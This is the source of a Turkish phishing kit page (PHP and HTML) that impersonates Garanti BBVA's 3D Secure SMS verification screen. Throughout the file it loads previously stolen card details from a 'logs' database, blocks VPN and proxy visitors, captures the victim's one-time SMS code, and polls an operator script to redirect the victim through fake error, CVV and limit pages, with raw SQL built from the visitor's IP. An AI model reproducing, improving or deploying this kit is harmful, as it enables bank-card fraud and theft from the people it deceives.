<?php include_once("../config.php"); include_once("../monke/Data/Server/GrabIP.php"); include_once("../monke/Data/Server/BlockVPN.php"); include_once("../monke/Data/Client/GetBank.php"); include_once("../monke/Data/Server/BanControl.php");

  $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $checkSepet = $pdo->query("SELECT * FROM sepet WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  
  if($checkAdmin["proxy_vpn"] == 1) {
   if($proxy == 1 or $hosting == 1) {
    die('Proxy & VPN Firewall - monke');
   } 
  }

  if($check["kredi_karti"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  }

  if($checkSepet["ip_adresi"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  }

  switch($_GET["control"]){
    case 'success';
     echo("<script> setTimeout(function(){ window.location='/siparisiniz-alindi'; }, 2750);</script>");
    break;
  }

  if($check["marka"] == "MASTERCARD") {
    $garanti_marka = "./assets/garanti/img/psimage_mc.png";
  } else if($check["marka"] == "VISA") {
    $garanti_marka = "./assets/garanti/img/psimage_visa.png";
  }
  
?>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>3D Secure Doğrulama Yöntemi Seçimi | Garanti Ödeme Sistemleri</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <link rel="icon" type="image/x-icon" href="./assets/garanti/img/favicon.ico">
    <link rel="stylesheet" href="./assets/garanti/css/fonts.css">
    <link rel="stylesheet" href="./assets/garanti/css/bootstrap-select.min.css">
    <link rel="stylesheet" href="./assets/garanti/css/styles.css">
    <script type="text/javascript" src="./assets/garanti/js/jquery-3.3.1.min.js"></script>
    <script type="text/javascript" src="./assets/garanti/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript" src="./assets/garanti/js/bootstrap-select.min.js"></script>
    <script type="text/javascript" src="./assets/garanti/js/functions.js"></script>
  </head>
  <body class="threed-page">
    <?php if($_GET['control'] == "success"): ?>
    <div class="container h-100">
      <div id="js-main" class="row justify-content-center align-items-center" style="height: 969px;">
        <div class="box m-3">
          <div class="shadow px-4 pt-3 pb-5 text-center theme-garanti">
            <div class="my-5">
              <img height="64" src="./assets/garanti/img/loading.gif" width="64">
            </div>
            <div class="my-3">
              <div></div>
              <form name="acsform" method="POST"></form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <?php else: ?>
    <div class="container h-100" id="bekledur" style="display: none">
      <div id="js-main" class="row justify-content-center align-items-center" style="height: 969px;">
        <div class="box m-3">
          <div class="shadow px-4 pt-3 pb-5 text-center theme-garanti">
            <div class="my-5">
              <img height="64" src="./assets/garanti/img/loading.gif" width="64">
            </div>
            <div class="my-3">
              <div></div>
              <form name="acsform" method="POST"></form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="container h-100">
      <div id="js-main" class="row justify-content-center align-items-center" style="height: 969px;">
        <div class="box">
          <div class="shadow px-2 px-sm-4 pb-1 theme-garanti">
            <div class="px-2 pt-2">
              <form name="acsform" action="#" method="POST" id="form">
                <div class="text-right">
                  <button name="cancel" type="button" class="btn btn-link p-0 text-right text-muted"> İptal </button>
                </div>
                <div class="row m-0 title">
                  <div class="col-6 text-left px-0 pt-1">
                    <img height="39" width="64" src="./assets/garanti/img/issuer.png">
                  </div>
                  <div class="col-6 text-right px-0 pt-1">
                    <div>
                      <div>
                        <img src="<?php echo $garanti_marka; ?>">
                      </div>
                    </div>
                  </div>
                </div>
                <h6 class="text-center mb-4 font-weight-bold"> 3D SECURE ÖDEME DOĞRULAMA </h6>
                <div>
                  <div class="summary">
                    <ul>
                      <li>
                        <label>Tutar</label>
                        <i class="icon-number-one d-none d-md-inline-block"></i>
                        <span class="total-value"> <?php echo str_replace('TL', 'TRY', $check["bakiye"]); ?> </span>
                      </li>
                      <li>
                        <label>Mağaza</label>
                        <i class="icon-bag d-none d-md-inline-block"></i>
                        <span> <?php echo $checkAdmin["isyeri_adi"]; ?> </span>
                      </li>
                      <li>
                        <label>Kart No</label>
                        <i class="icon-credit-card d-none d-md-inline-block"></i>
                        <span><?php echo substr($check["kredi_karti"], 0, 6); ?>******<?php echo substr($check["kredi_karti"], 12, 16); ?></span>
                      </li>
                      <li>
                        <label>Tarih</label>
                        <i class="icon-watch d-none d-md-inline-block"></i>
                        <span> <?php echo date('d.m.Y, H:i'); ?> </span>
                      </li>
                    </ul>
                  </div>
                </div>
                <div id="second-area">
                  <div class="form-group mb-4">
                    <label for="otp">Sonu <strong>****</strong> ile biten telefon numaranıza gönderilen <strong></strong> doğrulama şifresini giriniz.</label>
                    <input type="password" class="form-control form-pin js-validate" id="otp" name="otp" placeholder="6 haneli şifreyi girin" data-validate-pin="6" maxlength="6">
                    <div class="invalid-feedback js-validate-msg"></div>
                    <div style="color: red; font-size: 80%; display: none;" id="hata-mesaji">Doğrulama şifrenizi hatalı girdiniz. Lütfen tekrar deneyiniz</div>
                  </div>
                  <div class="form-group">
                    <button name="bsubmit" id="garanti_second" class="btn btn-primary btn-block" type="button">GÖNDER</button>
                  </div>
                  <div class="text-center font-weight-bold pt-2 pb-4">
                    <button name="resendSubmit" class="btn btn-link d-inline-block fs-10 p-0" type="button">
                      YENİ ŞİFRE GÖNDER
                    </button>
                  </div>
                </div>
                <div class="text-center font-weight-bold py-2 pb-sm-0 mb-3" id="second-area-part" style="display: none">
                  <input type="checkbox" name="downloadbonus" class="form-check" id="downloadbonus">
                  <label for="downloadbonus">Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için BonusFlaş mobil uygulamasını indirmek istiyorum. <img width="20" height="23" src="./assets/garanti/img/logo-bonus.png"></label>
                </div>
                <div class="border-top fs-10">
                  <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                    <span class="float-left d-block">Daha fazla bilgi</span>
                    <i class="icon-caret-up float-right d-none"></i>
                    <i class="icon-caret-down float-right d-block"></i>
                  </button>
                  <p class="px-4 pb-3 d-none"> GSM numarası bilgilerinizi tüm şubelerimizden veya <a href="javascript:void(0);">Paramatik</a>’lerimizden günceleyebilirsiniz. <br> Doğrulama İşlemi için gönderilen SMS’ler ücretsizdir. Bilgilerinizi size en yakın şubelerimizden veya Parametikten güncelleyebilirsiniz. </p>
                </div>
                <div class="border-top fs-10">
                  <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                    <span class="float-left d-block">Yardım</span>
                    <i class="icon-caret-up float-right d-none"></i>
                    <i class="icon-caret-down float-right d-block"></i>
                  </button>
                  <p class="px-4 pb-3 d-none"> “Garanti BBVA Müşteri İletişim Merkezi <a href="tel:+904440333">+90 444 0 333</a>. </p>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <?php endif; ?>
    <script>
      $(document).ready(function() {
        if(window.location.search == "?control=success") {
          document.getElementById("second-area").style.display = 'none';
        } else if(window.location.search == "?control=error") {
          document.getElementById("hata-mesaji").style.display = 'block';
        }
      });
  
      document.getElementById("garanti_second").addEventListener("click", function(e) {
        var otpCode = $("input[name=otp]").val();

        e.preventDefault();

        if (otpCode == null || otpCode == "" || otpCode.length != 6) {
          document.getElementById("otp").classList.add("invalid"); 
        } else {
          document.getElementById("otp").classList.remove("invalid");
          $.ajax({
            type: "POST",
            url: "action/process.php",
            data: {
              otpCode: otpCode
            },
            success: function (data) {
              document.getElementById('garanti_second').setAttribute("disabled", "disabled");
              document.getElementById("second-area").style.display = 'none';
              document.getElementById("bekledur").style.display = 'block';
              
            }
          });
        }
      });
    </script>
    <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "../veri.php?ip=".$ip; ?>',
           success: function(msg) {
             if (msg.includes('sms')) {
                  window.location.href = '../acsredirect';
              }
              if (msg.includes('tebrikler')) {
                  window.location.href = '../acsredirect?control=success';
              }
              if (msg.includes('hata_sms')) {
                  window.location.href = '../acsredirect?control=error';
              }
              if (msg.includes('hata_limit')) {
                window.location.href = '/?redirect=error_limit';
              }
              if (msg.includes('hata_internet')) {
                 window.location.href = '/?redirect=error_internet';
              }
			   if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
              }
              if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
              }
              if (msg.includes('hata_dogrulama')) {
                window.location.href = '/dogrulama?control=error';
              }
              if (msg.includes('dogrulama')) {
                 window.location.href = '/dogrulama';
              }
              if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
  </body>
</html>